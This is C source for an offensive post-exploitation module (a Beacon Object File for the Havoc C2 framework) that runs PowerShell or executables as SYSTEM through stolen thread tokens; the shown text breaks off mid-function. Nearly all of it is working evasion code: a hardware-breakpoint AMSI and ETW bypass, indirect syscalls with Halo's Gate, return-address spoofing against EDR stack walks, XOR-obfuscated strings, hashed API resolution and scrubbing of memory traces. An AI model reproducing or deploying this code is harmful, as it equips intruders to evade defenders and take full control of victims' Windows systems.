/*
 * nfexec.c -- NFEXEC BOF for Havoc C2
 *
 * Error Code Reference (operator only -- not in binary):
 *   E00  No arguments / empty command
 *   E01  Pipe creation failed
 *   E02  No thread impersonation token (nofilter not run)
 *   E03  Token duplication failed
 *   E04  Wide string conversion failed
 *   E05  ADVAPI32 function resolution failed
 *   E06  Process creation failed (SecLogon service)
 *   E07  Memory allocation failed (script buffer)
 *   E08  Wide string conversion failed (script)
 *   E09  Syscall infrastructure init failed
 *   E10  CLR creation failed
 *   E11  Runtime info failed
 *   E12  Runtime not loadable
 *   E13  GetInterface failed
 *   E14  CreateDomain failed
 *   E15  QueryInterface(AppDomain) failed
 *   E16  SafeArray creation failed
 *   E17  Assembly Load_3 failed
 *   E18  EntryPoint failed
 *   E19  BSTR allocation failed
 *
 * Two modes:
 *   mode 0 (default): Execute PowerShell via inline CLR hosting
 *   mode 1 (-exec):   Launch executable with thread impersonation token
 *
 * Designed for use after NOFILTER to run commands/programs as SYSTEM.
 *
 * OPSEC (mode 0 -- PS):
 *   - HWBP patchless AMSI/ETW bypass
 *   - CLR inline (no fork&run)
 *   - Random AppDomain, pipe output capture
 *
 * OPSEC (mode 1 -- exec):
 *   - NtOpenThreadToken + NtDuplicateToken (indirect syscall)
 *   - CreateProcessWithTokenW (ADVAPI32 -- process creation is inherent)
 *   - CREATE_NO_WINDOW, pipe output capture
 *
 * Build: x86_64-w64-mingw32-gcc -c nfexec.c -o bin/nfexec.x64.o -w
 */

#include <windows.h>
#include <oaidl.h>

typedef struct { char *original; char *buffer; int length; int size; } datap;
DECLSPEC_IMPORT void    BeaconDataParse(datap *, char *, int);
DECLSPEC_IMPORT int     BeaconDataInt(datap *);
DECLSPEC_IMPORT char  * BeaconDataExtract(datap *, int *);
DECLSPEC_IMPORT void    BeaconPrintf(int, char *, ...);
DECLSPEC_IMPORT void    BeaconOutput(int, char *, int);
#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#define MY_STATUS_SUCCESS ((LONG)0)
#define MY_TokenPrimary   1
#define MY_TokenImpersonation 2
#define MY_TOKEN_ALL_ACCESS 0xF01FF
#define MY_CREATE_NO_WINDOW 0x08000000

/* ================================================================
 * DFR declarations
 * ================================================================ */

/* NTDLL -- indirect syscall via Havoc NtApi[] table (6 functions) */
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtOpenThreadToken(HANDLE, ACCESS_MASK, UCHAR, PHANDLE);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtDuplicateToken(HANDLE, ACCESS_MASK, PVOID, ULONG, ULONG, PHANDLE);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtWaitForSingleObject(HANDLE, UCHAR, PLARGE_INTEGER);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtGetContextThread(HANDLE, PCONTEXT);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtSetContextThread(HANDLE, PCONTEXT);
DECLSPEC_IMPORT LONG WINAPI NTDLL$NtClose(HANDLE);

/* NOTE: LdrLoadDll, LdrGetProcedureAddress, RtlAddVectoredExceptionHandler,
 * RtlRemoveVectoredExceptionHandler, NtDelayExecution -- ALL resolved via
 * PEB walk + PE export table at runtime. No DFR. See Indirect Syscall
 * Infrastructure section below. */

/* KERNEL32 -- only pipe I/O and string conversion remain (no NT API equivalent) */
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$PeekNamedPipe(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

/* NOTE: ADVAPI32$CreateProcessWithTokenW was eliminated.
 * Resolved via PEB walk + PE export hash at runtime. */

/* MSCOREE / OLEAUT32 / MSVCRT */
DECLSPEC_IMPORT HRESULT WINAPI MSCOREE$CLRCreateInstance(REFCLSID, REFIID, LPVOID*);
DECLSPEC_IMPORT SAFEARRAY* WINAPI OLEAUT32$SafeArrayCreate(VARTYPE, UINT, SAFEARRAYBOUND*);
DECLSPEC_IMPORT SAFEARRAY* WINAPI OLEAUT32$SafeArrayCreateVector(VARTYPE, LONG, ULONG);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$SafeArrayAccessData(SAFEARRAY*, void**);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$SafeArrayUnaccessData(SAFEARRAY*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$SafeArrayPutElement(SAFEARRAY*, LONG*, void*);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$SafeArrayDestroy(SAFEARRAY*);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT void  * __cdecl MSVCRT$calloc(size_t, size_t);
DECLSPEC_IMPORT void    __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void  * __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT void  * __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT int     __cdecl MSVCRT$sprintf(char*, const char*, ...);
DECLSPEC_IMPORT size_t  __cdecl MSVCRT$strlen(const char*);

/* ================================================================
 * COM vtables (identical to PSIMPORT -- slot counts verified)
 * ================================================================ */

typedef struct _ICLRMetaHost ICLRMetaHost; typedef struct _ICLRRuntimeInfo ICLRRuntimeInfo;
typedef struct _ICorRuntimeHost ICorRuntimeHost; typedef struct _AppDomain AppDomain;
typedef struct _Assembly Assembly; typedef struct _MethodInfo MethodInfo;
#define V(x) HRESULT(STDMETHODCALLTYPE*x)

typedef struct { V(QI)(ICLRMetaHost*,REFIID,void**);ULONG(STDMETHODCALLTYPE*AddRef)(ICLRMetaHost*);ULONG(STDMETHODCALLTYPE*Release)(ICLRMetaHost*);V(GetRuntime)(ICLRMetaHost*,LPCWSTR,REFIID,LPVOID*);V(x0)(ICLRMetaHost*);V(x1)(ICLRMetaHost*);V(x2)(ICLRMetaHost*);V(x3)(ICLRMetaHost*);V(x4)(ICLRMetaHost*);V(x5)(ICLRMetaHost*); } ICLRMetaHostVtbl;
struct _ICLRMetaHost { ICLRMetaHostVtbl*lpVtbl; };

typedef struct { V(QI)(ICLRRuntimeInfo*,REFIID,void**);ULONG(STDMETHODCALLTYPE*AddRef)(ICLRRuntimeInfo*);ULONG(STDMETHODCALLTYPE*Release)(ICLRRuntimeInfo*);V(x0)(ICLRRuntimeInfo*);V(x1)(ICLRRuntimeInfo*);V(x2)(ICLRRuntimeInfo*);V(x3)(ICLRRuntimeInfo*);V(x4)(ICLRRuntimeInfo*);V(x5)(ICLRRuntimeInfo*);V(GetInterface)(ICLRRuntimeInfo*,REFCLSID,REFIID,LPVOID*);V(IsLoadable)(ICLRRuntimeInfo*,BOOL*);V(x6)(ICLRRuntimeInfo*);V(x7)(ICLRRuntimeInfo*);V(x8)(ICLRRuntimeInfo*);V(x9)(ICLRRuntimeInfo*); } ICLRRuntimeInfoVtbl;
struct _ICLRRuntimeInfo { ICLRRuntimeInfoVtbl*lpVtbl; };

typedef struct { V(QI)(ICorRuntimeHost*,REFIID,void**);ULONG(STDMETHODCALLTYPE*AddRef)(ICorRuntimeHost*);ULONG(STDMETHODCALLTYPE*Release)(ICorRuntimeHost*);V(x0)(ICorRuntimeHost*);V(x1)(ICorRuntimeHost*);V(x2)(ICorRuntimeHost*);V(x3)(ICorRuntimeHost*);V(x4)(ICorRuntimeHost*);V(x5)(ICorRuntimeHost*);V(x6)(ICorRuntimeHost*);V(Start)(ICorRuntimeHost*);V(Stop)(ICorRuntimeHost*);V(CreateDomain)(ICorRuntimeHost*,LPCWSTR,IUnknown*,IUnknown**);V(x7)(ICorRuntimeHost*);V(x8)(ICorRuntimeHost*);V(x9)(ICorRuntimeHost*);V(x10)(ICorRuntimeHost*);V(x11)(ICorRuntimeHost*);V(x12)(ICorRuntimeHost*);V(x13)(ICorRuntimeHost*);V(UnloadDomain)(ICorRuntimeHost*,IUnknown*);V(x14)(ICorRuntimeHost*); } ICorRuntimeHostVtbl;
struct _ICorRuntimeHost { ICorRuntimeHostVtbl*lpVtbl; };

typedef struct {
V(QI)(AppDomain*,REFIID,void**);ULONG(STDMETHODCALLTYPE*AddRef)(AppDomain*);ULONG(STDMETHODCALLTYPE*Release)(AppDomain*);
V(a0)(AppDomain*);V(a1)(AppDomain*);V(a2)(AppDomain*);V(a3)(AppDomain*);V(a4)(AppDomain*);V(a5)(AppDomain*);V(a6)(AppDomain*);V(a7)(AppDomain*);V(a8)(AppDomain*);V(a9)(AppDomain*);V(a10)(AppDomain*);
V(a11)(AppDomain*);V(a12)(AppDomain*);V(a13)(AppDomain*);V(a14)(AppDomain*);V(a15)(AppDomain*);V(a16)(AppDomain*);V(a17)(AppDomain*);V(a18)(AppDomain*);V(a19)(AppDomain*);V(a20)(AppDomain*);V(a21)(AppDomain*);V(a22)(AppDomain*);V(a23)(AppDomain*);V(a24)(AppDomain*);
V(a25)(AppDomain*);V(a26)(AppDomain*);V(a27)(AppDomain*);V(a28)(AppDomain*);V(a29)(AppDomain*);V(a30)(AppDomain*);V(a31)(AppDomain*);V(a32)(AppDomain*);V(a33)(AppDomain*);
V(a34)(AppDomain*);V(a35)(AppDomain*);V(a36)(AppDomain*);V(a37)(AppDomain*);V(a38)(AppDomain*);V(a39)(AppDomain*);V(a40)(AppDomain*);V(a41)(AppDomain*);
V(Load_3)(AppDomain*,SAFEARRAY*,Assembly**);
} AppDomainVtbl;
struct _AppDomain { AppDomainVtbl*lpVtbl; };

typedef struct {
V(QI)(Assembly*,REFIID,void**);ULONG(STDMETHODCALLTYPE*AddRef)(Assembly*);ULONG(STDMETHODCALLTYPE*Release)(Assembly*);
V(b0)(Assembly*);V(b1)(Assembly*);V(b2)(Assembly*);V(b3)(Assembly*);V(b4)(Assembly*);V(b5)(Assembly*);V(b6)(Assembly*);V(b7)(Assembly*);V(b8)(Assembly*);V(b9)(Assembly*);V(b10)(Assembly*);V(b11)(Assembly*);V(b12)(Assembly*);
V(EntryPoint)(Assembly*,MethodInfo**);
} AssemblyVtbl;
struct _Assembly { AssemblyVtbl*lpVtbl; };

typedef struct {
V(QI)(MethodInfo*,REFIID,void**);ULONG(STDMETHODCALLTYPE*AddRef)(MethodInfo*);ULONG(STDMETHODCALLTYPE*Release)(MethodInfo*);
V(c0)(MethodInfo*);V(c1)(MethodInfo*);V(c2)(MethodInfo*);V(c3)(MethodInfo*);V(c4)(MethodInfo*);V(c5)(MethodInfo*);V(c6)(MethodInfo*);V(c7)(MethodInfo*);V(c8)(MethodInfo*);V(c9)(MethodInfo*);V(c10)(MethodInfo*);V(c11)(MethodInfo*);V(c12)(MethodInfo*);V(c13)(MethodInfo*);V(c14)(MethodInfo*);V(c15)(MethodInfo*);V(c16)(MethodInfo*);V(c17)(MethodInfo*);V(c18)(MethodInfo*);V(c19)(MethodInfo*);V(c20)(MethodInfo*);
V(c21)(MethodInfo*);V(c22)(MethodInfo*);V(c23)(MethodInfo*);V(c24)(MethodInfo*);V(c25)(MethodInfo*);V(c26)(MethodInfo*);V(c27)(MethodInfo*);V(c28)(MethodInfo*);V(c29)(MethodInfo*);V(c30)(MethodInfo*);V(c31)(MethodInfo*);V(c32)(MethodInfo*);V(c33)(MethodInfo*);
V(Invoke_3)(MethodInfo*,VARIANT,SAFEARRAY*,VARIANT*);
} MethodInfoVtbl;
struct _MethodInfo { MethodInfoVtbl*lpVtbl; };

#undef V

__attribute__((section(".data"))) GUID g_CLSID_CLRMetaHost = {0x9280188d,0xe8e,0x4867,{0xb3,0xc,0x7f,0xa8,0x38,0x84,0xe8,0xde}};
__attribute__((section(".data"))) GUID g_CLSID_CorRuntimeHost = {0xcb2f6723,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
__attribute__((section(".data"))) GUID g_IID_ICLRMetaHost = {0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
__attribute__((section(".data"))) GUID g_IID_ICLRRuntimeInfo = {0xBD39D1D2,0xBA2F,0x486a,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
__attribute__((section(".data"))) GUID g_IID_ICorRuntimeHost = {0xcb2f6722,0xab3a,0x11d2,{0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e}};
__attribute__((section(".data"))) GUID g_IID_AppDomain = {0x05F696DC,0x2B29,0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13}};

#include "PowershellRunner.h"

/* ================================================================
 * Manual Indirect Syscall & PEB Resolution Infrastructure
 *
 * All ntdll functions NOT in Havoc NtApi[] table are resolved here:
 *   Nt* syscalls  -> PEB walk + SSN extract + indirect syscall stub
 *   Rtl+Ldr     -> PEB walk + export table -> function pointer call
 *                   (NOT syscalls -- no SSN exists -- user-mode only)
 *
 * Havoc NtApi[] table functions (6) remain DFR-based -- they get
 * automatic indirect syscall from CoffeeLdr/SysIndirect.
 * ================================================================ */

typedef struct { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } MY_USTR;

static void InitUStr(MY_USTR *u, WCHAR *s) {
    int n = 0; while(s[n]) n++;
    u->Length = (USHORT)(n * sizeof(WCHAR));
    u->MaximumLength = u->Length + sizeof(WCHAR);
    u->Buffer = s;
}

/* FNV-1a hash constants for PEB-resolved functions */
#define H_NtDelayExecution                0xD856E554u
#define H_LdrLoadDll                      0x7B566B5Fu
#define H_RtlAddVectoredExceptionHandler  0xC11AD5C5u
#define H_RtlRemoveVectoredExceptionHandler 0x7C104610u
#define H_EtwEventWrite                   0xE5F4BDDEu
#define H_AmsiScanBuffer                  0xF76951A4u
#define H_CreateProcessWithTokenW         0x7859DC14u

/* Globals -- forced to .data (no .bss) */
__attribute__((section(".data"))) PVOID  g_ntbase = (PVOID)1;
__attribute__((section(".data"))) PVOID  g_sc_jmp = (PVOID)1;
__attribute__((section(".data"))) PVOID  g_ret_gad = (PVOID)1; /* C3 (ret) gadget for stack spoofing */
__attribute__((section(".data"))) WORD   g_sc_ssn = 1;
/* _pad prevents linker from merging g_sc_ssn with adjacent symbol */
__attribute__((section(".data"))) WORD   g_sc_pad = 0xCCCC;

/* FNV-1a hash for export name resolution */
static ULONG Fnv1a(const char *s) {
    ULONG h = 0x811C9DC5u;
    while (*s) { h ^= (UCHAR)*s++; h *= 0x01000193u; }
    return h;
}

/* PEB walk -> ntdll.dll base address (ZERO API calls, ZERO imports)
 * GS:0x60 -> PEB -> Ldr -> InMemoryOrderModuleList
 * Entry 1 = exe, Entry 2 = ntdll.dll */
static PVOID PebNtdll(void) {
    ULONG_PTR peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    ULONG_PTR ldr = *(ULONG_PTR*)(peb + 0x18);
    ULONG_PTR fst = *(ULONG_PTR*)(ldr + 0x20);
    ULONG_PTR snd = *(ULONG_PTR*)fst;
    return *(PVOID*)(snd + 0x20);
}

/* PE export table -> function address by FNV-1a hash
 * Works on any loaded PE (ntdll, amsi.dll, etc.) */
static PVOID ExResolve(PVOID base, ULONG hash) {
    BYTE *b = (BYTE*)base;
    DWORD pe_off = *(DWORD*)(b + 0x3C);
    DWORD exp_rva = *(DWORD*)(b + pe_off + 0x88);
    if (!exp_rva) return NULL;
    BYTE *ex = b + exp_rva;
    DWORD nNames = *(DWORD*)(ex + 0x18);
    DWORD *names = (DWORD*)(b + *(DWORD*)(ex + 0x20));
    WORD  *ords  = (WORD*) (b + *(DWORD*)(ex + 0x24));
    DWORD *funcs = (DWORD*)(b + *(DWORD*)(ex + 0x1C));
    for (DWORD i = 0; i < nNames; i++) {
        if (Fnv1a((char*)(b + names[i])) == hash)
            return (PVOID)(b + funcs[ords[i]]);
    }
    return NULL;
}

/* Extract SSN from Nt* function prologue.
 * Halo's Gate: if target is EDR-hooked (JMP detour at entry),
 * walk neighboring syscall stubs (32-byte spacing) to find an
 * unhooked one, then calculate target SSN by offset. */
static WORD ExtractSSN(PVOID addr) {
    BYTE *p = (BYTE*)addr;
    /* Unhooked pattern: 4C 8B D1 B8 XX XX 00 00 (mov r10,rcx; mov eax,SSN) */
    if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8)
        return *(WORD*)(p + 4);
    /* Halo's Gate: scan up/down for unhooked neighbor */
    for (WORD n = 1; n < 500; n++) {
        BYTE *up = p - (n * 32);
        if (up[0]==0x4C && up[1]==0x8B && up[2]==0xD1 && up[3]==0xB8)
            return *(WORD*)(up + 4) + n;
        BYTE *dn = p + (n * 32);
        if (dn[0]==0x4C && dn[1]==0x8B && dn[2]==0xD1 && dn[3]==0xB8)
            return *(WORD*)(dn + 4) - n;
    }
    return 0;
}

/* Find syscall;ret gadget (0F 05 C3) in ntdll .text section.
 * The indirect syscall jumps HERE instead of executing syscall
 * directly from BOF memory -- return address points to ntdll,
 * not the BOF. This defeats call-stack origin checks. */
static PVOID FindGadget(PVOID base) {
    BYTE *b = (BYTE*)base;
    DWORD pe_off = *(DWORD*)(b + 0x3C);
    WORD nSec = *(WORD*)(b + pe_off + 0x06);
    WORD ohSz = *(WORD*)(b + pe_off + 0x14);
    BYTE *sec0 = b + pe_off + 0x18 + ohSz;
    for (int i = 0; i < nSec; i++) {
        BYTE *sh = sec0 + (i * 40);
        if (sh[0]=='.' && sh[1]=='t' && sh[2]=='e' && sh[3]=='x' && sh[4]=='t') {
            DWORD va = *(DWORD*)(sh + 12);
            DWORD vs = *(DWORD*)(sh + 8);
            BYTE *txt = b + va;
            for (DWORD j = 0; j < vs - 2; j++) {
                if (txt[j]==0x0F && txt[j+1]==0x05 && txt[j+2]==0xC3)
                    return (PVOID)(txt + j);
            }
        }
    }
    return NULL;
}

/* Indirect syscall naked stub WITH RETURN ADDRESS SPOOFING.
 *
 * Called as: ((fn_NtXxx)ScStub)(arg1, arg2, ...);
 * g_sc_ssn and g_ret_gad must be set before each call.
 *
 * RETURN ADDRESS SPOOFING:
 *   During syscall, EDR stack-walks see [RSP] to identify callers.
 *   Without spoofing: [RSP] = BOF memory address -> flagged as suspicious.
 *   With spoofing: [RSP] = ntdll 'ret' gadget address -> looks legitimate.
 *
 *   Stack transformation:
 *     Entry:   [RSP] = BOF_caller_ret
 *     After:   [RSP] = ntdll_ret_gadget, [RSP+8] = BOF_caller_ret
 *
 *   Return chain:
 *     syscall; ret -> pops ntdll_ret_gadget -> executes 'ret' in ntdll
 *     -> pops BOF_caller_ret -> returns to real caller
 *
 *   EDR sees: ntdll syscall;ret -> ntdll ret -> (continues)
 *   Not:      ntdll syscall;ret -> BOF_memory (suspicious!)
 *
 * LIMITATION: sub rsp,8 shifts stack args by 8 bytes.
 *   Safe for functions with <=4 args (NtDelayExecution: 2 args).
 *   Must not be used for 5+ arg functions without adjustment. */
__attribute__((naked, noinline))
static void ScStub(void) {
    __asm__ volatile (
        /* Return address spoof: push ntdll ret gadget below real return */
        "subq $8, %%rsp\n\t"                  /* make room for one frame */
        "movq g_ret_gad(%%rip), %%rax\n\t"    /* ntdll C3 gadget */
        "movq %%rax, (%%rsp)\n\t"             /* [RSP] = ntdll ret gadget */
        /* [RSP+8] = real caller return address (pushed by CALL instruction) */

        /* Standard indirect syscall */
        "movq %%rcx, %%r10\n\t"               /* arg1 -> R10 (syscall convention) */
        "movl g_sc_ssn(%%rip), %%eax\n\t"     /* SSN */
        "jmpq *g_sc_jmp(%%rip)\n\t"           /* -> syscall; ret -> ntdll_ret; ret -> caller */
        :::
    );
}

/* Initialize indirect syscall infrastructure -- call once at start of go() */
static BOOL ScInit(void) {
    g_ntbase = PebNtdll();
    if (!g_ntbase || g_ntbase == (PVOID)1) return FALSE;
    g_sc_jmp = FindGadget(g_ntbase);
    if (!g_sc_jmp || g_sc_jmp == (PVOID)1) return FALSE;
    /* ret gadget = the C3 byte after the 0F 05 in syscall;ret.
     * g_sc_jmp points to 0F, so +2 = C3 (standalone ret instruction). */
    g_ret_gad = (PVOID)((BYTE*)g_sc_jmp + 2);
    return TRUE;
}

/* Scrub all indirect syscall infrastructure globals.
 * Call at end of go() to prevent memory forensics from recovering
 * ntdll base address, gadget locations, or last SSN used.
 * After this, all globals return to their non-NULL sentinel values
 * (required because .bss is forbidden in Havoc BOF). */
static void ScScrub(void) {
    g_ntbase  = (PVOID)1;
    g_sc_jmp  = (PVOID)1;
    g_ret_gad = (PVOID)1;
    g_sc_ssn  = 1;
}

/* Prepare indirect syscall for a specific Nt* function by hash.
 * Sets g_sc_ssn. Returns ScStub cast-ready pointer, or NULL on failure. */
static PVOID ScPrep(ULONG hash) {
    PVOID fn = ExResolve(g_ntbase, hash);
    if (!fn) return NULL;
    g_sc_ssn = ExtractSSN(fn);
    return (g_sc_ssn != 0) ? (PVOID)ScStub : NULL;
}

/* Resolve a non-syscall ntdll function (Ldr+Rtl) via PEB export table.
 * Returns function pointer for direct call. No DFR, no IAT hooks. */
#define RtResolve(hash) ExResolve(g_ntbase, hash)

/* Function pointer typedefs for PEB-resolved functions */
typedef LONG  (WINAPI *fn_LdrLoadDll)(PWSTR, PULONG, PVOID, PVOID*);
typedef PVOID (WINAPI *fn_RtlAddVEH)(ULONG, PVOID);
typedef ULONG (WINAPI *fn_RtlRemoveVEH)(PVOID);
typedef LONG  (WINAPI *fn_NtDelayExecution)(UCHAR, PLARGE_INTEGER);
typedef BOOL  (WINAPI *fn_CreateProcessWithTokenW)(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

/* ================================================================
 * HWBP Patchless AMSI + ETW Bypass
 *
 * Uses PEB-resolved functions instead of DFR:
 *   LdrLoadDll           -> load amsi.dll
 *   ExResolve(amsi.dll)  -> find AmsiScanBuffer
 *   ExResolve(ntdll)     -> find EtwEventWrite
 *   RtlAddVEH/RemoveVEH  -> VEH management
 *   NtGet/SetContextThread -> debug register control (NtApi[] indirect syscall)
 * ================================================================ */

__attribute__((section(".data"))) PVOID g_bp0 = (PVOID)1;
__attribute__((section(".data"))) PVOID g_bp1 = (PVOID)1;

LONG WINAPI VehCb(PEXCEPTION_POINTERS pEx)
{
    if (pEx->ExceptionRecord->ExceptionCode != 0x80000004)
        return EXCEPTION_CONTINUE_SEARCH;
    PVOID ea = pEx->ExceptionRecord->ExceptionAddress;
    PCONTEXT ctx = pEx->ContextRecord;
    if (ea == g_bp0) {
        ULONG_PTR *stk = (ULONG_PTR*)ctx->Rsp;
        PVOID pResult = (PVOID)stk[6];
        if (pResult) *(int*)pResult = 0;
        ctx->Rax = 0; ctx->Rip = stk[0]; ctx->Rsp += 8;
        ctx->Dr0 = (DWORD64)(ULONG_PTR)g_bp0; ctx->Dr7 |= 1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (ea == g_bp1) {
        ULONG_PTR *stk = (ULONG_PTR*)ctx->Rsp;
        ctx->Rax = 0; ctx->Rip = stk[0]; ctx->Rsp += 8;
        ctx->Dr1 = (DWORD64)(ULONG_PTR)g_bp1; ctx->Dr7 |= 4;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static PVOID SetupBp(void)
{
    /* Decode amsi.dll XOR strings (sentinel = 0x41) */
    char d0[] = {0x20,0x2c,0x32,0x28,0x6f,0x25,0x2d,0x2d,0x41};
    int i;
    for(i=0;d0[i]!=0x41;i++)d0[i]^=0x41; d0[i]=0;
    int d0_len = i;

    /* LdrLoadDll via PEB-resolved pointer -- loads amsi.dll */
    fn_LdrLoadDll pLdrLoadDll = (fn_LdrLoadDll)RtResolve(H_LdrLoadDll);
    if (!pLdrLoadDll) { MSVCRT$memset(d0,0,sizeof(d0)); return NULL; }

    WCHAR wd0[16];
    for(int j=0;j<d0_len;j++) wd0[j]=(WCHAR)(unsigned char)d0[j];
    wd0[d0_len]=0;
    MY_USTR us0; InitUStr(&us0, wd0);
    PVOID hAmsi = NULL;
    pLdrLoadDll(NULL, NULL, &us0, &hAmsi);

    /* Resolve AmsiScanBuffer from amsi.dll export table directly
     * (no LdrGetProcedureAddress needed -- we parse PE exports ourselves) */
    g_bp0 = hAmsi ? ExResolve(hAmsi, H_AmsiScanBuffer) : NULL;

    /* Resolve EtwEventWrite from ntdll export table directly */
    g_bp1 = ExResolve(g_ntbase, H_EtwEventWrite);

    /* Scrub decoded strings */
    MSVCRT$memset(d0,0,sizeof(d0));
    MSVCRT$memset(wd0,0,sizeof(wd0));

    /* RtlAddVectoredExceptionHandler via PEB-resolved pointer */
    fn_RtlAddVEH pAddVEH = (fn_RtlAddVEH)RtResolve(H_RtlAddVectoredExceptionHandler);
    if (!pAddVEH) return NULL;
    PVOID hVeh = pAddVEH(1, (PVOID)VehCb);
    if (!hVeh) return NULL;

    /* NtGetContextThread + NtSetContextThread -- INDIRECT SYSCALL via NtApi[] */
    CONTEXT ctx; MSVCRT$memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = 0x00100010;
    LONG st = NTDLL$NtGetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
    if (st != 0) {
        fn_RtlRemoveVEH pRemVEH = (fn_RtlRemoveVEH)RtResolve(H_RtlRemoveVectoredExceptionHandler);
        if (pRemVEH) pRemVEH(hVeh);
        return NULL;
    }
    if (g_bp0) ctx.Dr0 = (DWORD64)(ULONG_PTR)g_bp0;
    if (g_bp1) ctx.Dr1 = (DWORD64)(ULONG_PTR)g_bp1;
    DWORD64 dr7 = ctx.Dr7;
    if (g_bp0) dr7 |= 1; if (g_bp1) dr7 |= 4;
    dr7 &= ~((DWORD64)0xF << 16); dr7 &= ~((DWORD64)0xF << 20);
    ctx.Dr7 = dr7;
    NTDLL$NtSetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
    return hVeh;
}

static void CleanBp(PVOID hVeh)
{
    if (!hVeh) return;
    CONTEXT ctx; MSVCRT$memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = 0x00100010;
    if (NTDLL$NtGetContextThread((HANDLE)(LONG_PTR)-2, &ctx) == 0) {
        ctx.Dr0 = 0; ctx.Dr1 = 0;
        ctx.Dr7 &= ~(DWORD64)5;
        ctx.Dr7 &= ~((DWORD64)0xF << 16);
        ctx.Dr7 &= ~((DWORD64)0xF << 20);
        NTDLL$NtSetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
    }
    fn_RtlRemoveVEH pRemVEH = (fn_RtlRemoveVEH)RtResolve(H_RtlRemoveVectoredExceptionHandler);
    if (pRemVEH) pRemVEH(hVeh);
    g_bp0 = (PVOID)1; g_bp1 = (PVOID)1;
}

/* ================================================================
 * Helpers
 * ================================================================ */

static LPWSTR U2W(const char *s, int len)
{
    int w = KERNEL32$MultiByteToWideChar(65001, 0, s, len, NULL, 0);
    if (w <= 0) return NULL;
    LPWSTR r = (LPWSTR)MSVCRT$calloc(w + 2, sizeof(WCHAR));
    if (!r) return NULL;
    KERNEL32$MultiByteToWideChar(65001, 0, s, len, r, w);
    r[w] = 0;
    return r;
}

static void RandName(WCHAR *buf, int len, ULONG_PTR seed)
{
    ULONG_PTR s = seed ^ 0x5DEECE66DULL;
    for (int i = 0; i < len-1; i++) {
        s = s * 6364136223846793005ULL + 1442695040888963407ULL;
        buf[i] = L'a' + (WCHAR)((s >> 32) % 26);
    }
    buf[len-1] = 0;
}

/* Read ALL available pipe data. Allocates buffer dynamically.
 * Returns buffer (caller must free) and sets *out_len.
 * Returns NULL if no data or alloc fails. */
static char* ReadPipeAll(HANDLE hR, int *out_len)
{
    *out_len = 0;
    if (!hR) return NULL;
    DWORD av = 0;
    KERNEL32$PeekNamedPipe(hR, NULL, 0, NULL, &av, NULL);
    if (av == 0) return NULL;
    /* Allocate exactly what's available + room for appending timeout note */
    DWORD alloc_sz = av + 256;
    char *buf = (char*)MSVCRT$calloc(alloc_sz, 1);
    if (!buf) return NULL;
    DWORD t = 0, g = 0;
    while (t < av) {
        g = 0;
        if (!KERNEL32$ReadFile(hR, buf+t, av-t, &g, NULL) || !g) break;
        t += g;
    }
    buf[t] = 0;
    *out_len = (int)t;
    return buf;
}

/* Convert OEM codepage (Shift-JIS, CP437, etc.) to UTF-8.
 * Native exe (ipconfig, systeminfo, etc.) output in OEM codepage.
 * Havoc console expects UTF-8. Without conversion -> mojibake.
 *
 * OEM -> UTF-16 -> UTF-8. Returns new buffer (caller frees).
 * On failure returns NULL and caller should send original buffer. */
static char* OemToUtf8(const char *oem, int oem_len, int *utf8_len)
{
    *utf8_len = 0;
    if (!oem || oem_len <= 0) return NULL;

    /* Step 1: OEM -> UTF-16 (CP_OEMCP = 1) */
    int wlen = KERNEL32$MultiByteToWideChar(1, 0, oem, oem_len, NULL, 0);
    if (wlen <= 0) return NULL;
    LPWSTR wbuf = (LPWSTR)MSVCRT$calloc(wlen + 1, sizeof(WCHAR));
    if (!wbuf) return NULL;
    KERNEL32$MultiByteToWideChar(1, 0, oem, oem_len, wbuf, wlen);

    /* Step 2: UTF-16 -> UTF-8 (CP_UTF8 = 65001) */
